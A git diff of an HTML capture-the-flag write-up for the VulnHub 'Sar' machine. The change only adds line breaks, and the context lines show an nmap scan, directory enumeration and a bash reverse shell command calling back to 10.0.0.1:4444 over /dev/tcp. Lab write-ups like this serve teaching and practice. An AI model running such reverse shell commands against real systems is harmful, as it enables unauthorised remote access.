@@ -31,6 +31,8 @@ layout: default
 # Nmap 7.91 scan initiated Fri Sep 24 11:05:28 2021 as: nmap -p80 -sV -sC -oN script_tcp 10.0.0.18&#13;&#10;Nmap scan report for 10.0.0.18&#13;&#10;Host is up (0.00021s latency).&#13;&#10;&#13;&#10;PORT   STATE SERVICE VERSION&#13;&#10;80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))&#13;&#10;|_http-server-header: Apache/2.4.29 (Ubuntu)&#13;&#10;|_http-title: Apache2 Ubuntu Default Page: It works&#13;&#10;MAC Address: 00:0C:29:56:34:62 (VMware)&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Fri Sep 24 11:05:41 2021 -- 1 IP address (1 host up) scanned in 13.12 seconds
     </pre>
 
+    <br>
+
     <h2>Information Gathering</h2>
 
     <li>The web server on port 80 seems to be the only service running.  I start off with some gobuster scans to try to enumerate any hidden directories.  Nothing turns up so I turn my attention to /robots.txt.</li>
@@ -71,6 +73,8 @@ Copied to: /home/kali/Documents/VulnHub/Sars/49344.py
     <li>In the above, we can see how we are manually able to do what the script does, and it works.  We get command execution.  Now we go for a reverse shell.  I will use "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'" for my reverse shell and url encode it.</li>
 
     <img src="../images/sar/rev_shell.png">
+
+    <br>
 
     <h2>Foothold</h2>
 
